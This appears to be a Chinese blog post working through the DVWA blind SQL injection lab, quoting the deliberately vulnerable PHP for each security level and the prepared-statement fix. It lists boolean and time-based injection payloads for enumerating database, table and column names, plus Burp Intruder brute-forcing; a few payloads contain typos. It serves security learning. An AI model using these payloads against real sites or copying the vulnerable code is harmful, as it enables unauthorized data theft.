---
layout:    post
title:     DVWA之SQL-Injection(Blind)
subtitle:  学习学习
date:      2020-12-11
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:

   - DVWA
---

#### SQL Injection(Blind)

sql注入和sql盲注区别：注入可以看到详细的内容(具体的查询内容与报错)，而盲注只会显示出对错(即回复你一个：是 与 不是)，没有其他提示。

盲注又有布尔盲注和时间盲注，这里不做详细解释了，之后会做一篇SQL总结。

##### low

```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

代码木有对参数id做任何的检查，过滤，存在明显的SQL注入漏洞，但回显结果只有``User ID exists in the database.``, `User ID is MISSING from the database.`两种了，不会返回其他数据。所以为SQL盲注。

**布尔盲注：** 

1.首先要判断注入类型：输入 1 提交回显正确

[![rElTLn.png](https://s3.ax1x.com/2020/12/11/rElTLn.png)](https://imgchr.com/i/rElTLn)

输入 1' 回显错误

[![rElOiT.png](https://s3.ax1x.com/2020/12/11/rElOiT.png)](https://imgchr.com/i/rElOiT)

输入  ``1' # `` 回显正确，说明为基于 ' 的字符型注入类型。

2.猜测数据库名称：

先猜测数据库名长度：

```
1' and length(database())=1 #  //显示错误
1' and length(database())=2 #  //显示错误
1' and length(database())=3 #  //显示错误
1' and length(database())=4 #  //显示正确
```

说明数据库名长度为4。

猜测数据库名(可以采用二分法)：

```
1' and ascii(substr(database(),1,1))>97 #  //说明数据库名第一个字母ascii值大于97
1' and ascii(substr(database(),1,1))<100 #  //说明数据库名第一个字母ascii值不小于100
1' and ascii(substr(database(),1,1))>100 #  //说明其不大于100
```

得到数据库名第一个字母ascii值为100，字母为：d

同理猜得数据库名为dvwa。

3.猜测数据库中的表名：

先猜测数据库的表的数量：

```
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # //错误
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # //正确
```

得到数据库中表的数量为：2。

分别猜测表名的长度：

```
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #  //错误
....
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #  //正确
```

说明第一个表名长度为9。同理猜测第二个表名长度。

猜测表名：

```
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limt 0,1),1,1))>97 # //正确
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limt 0,1),1,1))<122 # //正确
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limt 0,1),1,1))<109 # //正确
...
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limt 0,1),1,1))<103 # //错误
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limt 0,1),1,1))>103 # //错误
```

得第一个表名的第一个字符为 g。

同理逐步得两个表名分别为：guestbook，users。

4.猜测表中的字段名：

猜测表中的字段数量：

```
1' and (select count(column_name) from information_schmea.columns where table_name='users')=1 #  //错误
...
1' and (select count(column_name) from information_schema.columns wehre table_name='users')=8 #  //正确
```

得表users有8个字段。

猜测字段名的长度：

```
1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=1 #  //错误
...
1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7 #  //正确
```

得到第一个字段名长度为7。同理猜测出所有的字段名长度。

5.猜测数据：

与上面基本一致了，先猜测数据长度，在逐个猜测字符。

**延时注入：**

1.判断是否存在注入，注入是字符型还是数字型。

```
1' and sleep(5) #  //感觉到明显延迟；
1 and sleep(5) #  //没有延迟；
```

说明存在字符型的基于时间的盲注。

2.猜解当前数据库名:

首先猜解数据名的长度：

```
1' and if(length(database())=1,sleep(5),1) #  //没有延迟 
1' and if(length(database())=2,sleep(5),1) #  //没有延迟 
1' and if(length(database())=3,sleep(5),1) #  //没有延迟 
1' and if(length(database())=4,sleep(5),1) #  //明显延迟
```

说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：

```
1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)#  //明显延迟
...
1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)#  //没有延迟 
1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)#  //没有延迟 
```

说明数据库名的第一个字符为小写字母d。

重复上述步骤，即可猜解出数据库名。

3.猜解数据库中的表名

首先猜解数据库中表的数量：

```
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#  //没有延迟
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)#  //明显延迟
```

说明数据库中有两个表。

接着挨个猜解表名：

```
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) #  //没有延迟
...
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #  //明显延迟
```

说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

4.猜解表中的字段名

首先猜解表中字段的数量：

```
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)#  //没有延迟
...
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)#  //明显延迟
```

说明users表中有8个字段。

接着挨个猜解字段名：

```
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) #  //没有延迟
...
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) #  //明显延迟
```

说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

5.猜解数据

同样采用二分法。

**使用burp：**

上面自己逐步猜测太慢了，所以我们可以使用工具来省时省力解决。

猜测数据库名：

还是先猜测数据库名长度：(抓包到burp，放到爆破框)

爆破的为其长度，所以把长度加到爆破选项：

[![rZ3UvF.md.png](https://s3.ax1x.com/2020/12/12/rZ3UvF.md.png)](https://imgchr.com/i/rZ3UvF)

到payloads框，将payload type选择为numbers,再在下框按图输入，代表从1开始到5结束，每次增加1。

[![rZG8pV.md.png](https://s3.ax1x.com/2020/12/12/rZG8pV.md.png)](https://imgchr.com/i/rZG8pV)

然后开始爆破：

[![rZGNm4.md.png](https://s3.ax1x.com/2020/12/12/rZGNm4.md.png)](https://imgchr.com/i/rZGNm4)

找到长度与其他不一致的为正确的，所以得到数据库名长度为4。

在猜测数据库名：

[![rZGjNn.md.png](https://s3.ax1x.com/2020/12/12/rZGjNn.md.png)](https://imgchr.com/i/rZGjNn)

同上，将ASCII值从1到127逐步增加，判断正确ASCII值

[![rZJm36.md.png](https://s3.ax1x.com/2020/12/12/rZJm36.md.png)](https://imgchr.com/i/rZJm36)

[![rZts10.md.png](https://s3.ax1x.com/2020/12/12/rZts10.md.png)](https://imgchr.com/i/rZts10)

得到第一个字符ASCII为100，得其为d。同理，逐步爆破出表名，列名，数据。

##### medium

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?> 
```

可以看出medium代码多出了**mysql_real_escape_string()**函数，对特殊字符串进行了转义。

特殊字符：\x00，\n，\r，\'，"，\x1a。

另外还设置了下拉表单，防止我们直接注入，但我们还是可以通过burp抓包，改包。

步骤同low，就是在burp中改就🆗。(这个为数字型注入)

##### high

```
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```

high级别的代码利用了cookie传递参数id，当SQL查询结果为空时，会执行还是sleep(seconds), 目的是为了扰乱基于时间盲注。并在SQL查询语句中添加了limit 1，控制输出的结果只显示一个。

因为存在sleep函数干扰就不使用时间盲注了，只进行布尔盲注，同时可以用#注释掉SQL语句后的limit 1。

[![rZaVlq.md.png](https://s3.ax1x.com/2020/12/12/rZaVlq.md.png)](https://imgchr.com/i/rZaVlq)

抓包，在cookie处修改id值进行注入。步骤还是同low。

##### impossible

```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防止SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，Anti-CSRF token机制的加入进一步提高了安全性。